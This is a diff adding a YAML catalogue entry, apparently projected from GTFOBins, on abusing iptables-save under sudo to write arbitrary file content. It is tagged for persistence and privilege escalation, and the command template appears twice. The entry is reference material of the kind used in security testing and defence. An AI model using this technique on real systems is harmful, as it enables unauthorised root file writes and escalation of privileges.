@@ -1,0 +1,86 @@
+id: gtfobins/iptables-save/file-write/sudo
+type: binary
+platform: linux
+name: iptables-save
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: 'iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
+
+    iptables -S
+
+    iptables-save -f /path/to/output-file'
+  comment: The content is written along with a number of `iptables` rules.
+references:
+- https://gtfobins.github.io/gtfobins/iptables-save/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        iptables-save:
+          functions:
+            file-write:
+            - binary: false
+              code: 'iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
+
+                iptables -S
+
+                iptables-save -f /path/to/output-file'
+              comment: The content is written along with a number of `iptables` rules.
+              contexts:
+                sudo: null
+    upstream_url: https://gtfobins.github.io/gtfobins/iptables-save/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-write
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: persistence
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:561369d34e7e37a452eb95efa4c1533398ce48ca8e46cbd1919635a5c182c46b
